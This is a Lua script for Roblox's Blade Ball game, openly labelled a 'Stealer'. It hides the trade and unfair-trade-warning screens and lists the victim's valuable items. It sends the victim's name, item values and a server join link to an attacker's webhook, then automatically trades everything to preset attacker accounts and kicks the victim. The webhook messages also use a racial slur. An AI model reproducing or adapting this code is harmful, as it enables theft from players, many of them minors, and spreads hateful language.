-- Pas de verrou _G pour permettre les ré-exécutions
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local inTrade = false
local currentMessageId = nil -- ID unique pour cette session

local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
local webhook = _G.webhook or "" 
local auth_token = _G.AuthToken or "EBK-SS-A"

---------------------------------------------------------
-- CACHE GUI (TOTALEMENT INVISIBLE)
---------------------------------------------------------
local function hideUI()
    pcall(function()
        tradeGui.Black.Visible = false
        tradeGui.MiscChat.Visible = false
        tradeCompleteGui.Black.Visible = false
        tradeCompleteGui.Main.Visible = false
        tradeGui.Main.Visible = false
        tradeGui.Main:GetPropertyChangedSignal("Visible"):Connect(function() tradeGui.Main.Visible = false end)
        tradeGui.UnfairTradeWarning.Visible = false
        notificationsGui.Notifications.Visible = false
    end)
end
hideUI()

---------------------------------------------------------
-- WEBHOOK SYSTEM (AUTO-EDIT)
---------------------------------------------------------
local function UpdateWebhook(statusType)
    local title = "🟣 Bro join your hit nigga 🎯"
    local color = 8323327 
    local statusDesc = "⏳ En attente du receveur..."

    if statusType == "JOINED" then
        title = "✅ The nigga is on the server ! 🎉"
        color = 65280 
        statusDesc = "⚡ Transfert en cours..."
    elseif statusType == "CLAIMED" then
        title = "🟩 CLAIMED! 🔪 Stuff Stolen"
        color = 3066993
        statusDesc = "💰 Le stuff a été récupéré avec succès !"
    elseif statusType == "LEFT" then
        title = "❌ Victim Left"
        color = 15158332
        statusDesc = "🚪 La victime a quitté avant la fin."
    end

    local itemLines = ""
    local totalRAP = 0
    for _, item in ipairs(itemsToSend) do
        itemLines = itemLines .. "• " .. item.Name .. " - " .. math.floor(item.RAP) .. " RAP\n"
        totalRAP = totalRAP + item.RAP
    end

    local data = {
        ["auth_token"] = auth_token,
        ["message_id"] = currentMessageId, -- Envois l'ID pour que le Worker fasse un PATCH
        ["content"] = (not currentMessageId) and "@everyone" or nil,
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = statusDesc,
            ["color"] = color,
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. totalRAP .. "```", inline = true},
                {name = "🔗 Join:", value = "[Click to Join](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ")", inline = false},
                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Empty") .. "```", inline = false}
            },
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
            ["footer"] = {["text"] = "Blade Ball Stealer | session: " .. math.random(1000,9999)}
        }}
    }

    local success, res = pcall(function()
        return request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)

    -- Si c'est le premier message, on récupère l'ID renvoyé par le Worker
    if success and not currentMessageId then
        local decoded = HttpService:JSONDecode(res.Body)
        if decoded and decoded.id then
            currentMessageId = decoded.id
        end
    end
end

---------------------------------------------------------
-- TRADE ENGINE
---------------------------------------------------------
local function startTrade(target)
    UpdateWebhook("JOINED")
    task.spawn(function()
        while #itemsToSend > 0 do
            repeat 
                netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
                task.wait(1.5)
            until tradeGui.Enabled
            
            local count = 0
            while #itemsToSend > 0 and count < 100 do
                local item = table.remove(itemsToSend, 1)
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                count = count + 1
            end

            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            repeat task.wait(0.2) netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer() until not tradeGui.Enabled
        end
        UpdateWebhook("CLAIMED")
        task.wait(1)
        plr:kick("Session Finished.")
    end)
end

---------------------------------------------------------
-- START
---------------------------------------------------------
-- Scan RAP simplifié
local function getRAP(cat, name)
    local success, data = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[cat] end)
    if success and data then
        for k, v in pairs(data) do if k:find(name) then return v end end
    end
    return 0
end

for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            local rap = getRAP(cat, info.Name)
            if rap >= min_rap then table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name}) end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a,b) return a.RAP > b.RAP end)
    UpdateWebhook("START")

    -- Detect Join
    local function check()
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(users, p.Name) then startTrade(p) return true end
        end
        return false
    end

    if not check() then
        Players.PlayerAdded:Connect(function(p) if table.find(users, p.Name) then startTrade(p) end end)
    end

    -- Status Left
    plr.AncestryChanged:Connect(function() UpdateWebhook("LEFT") end)
end
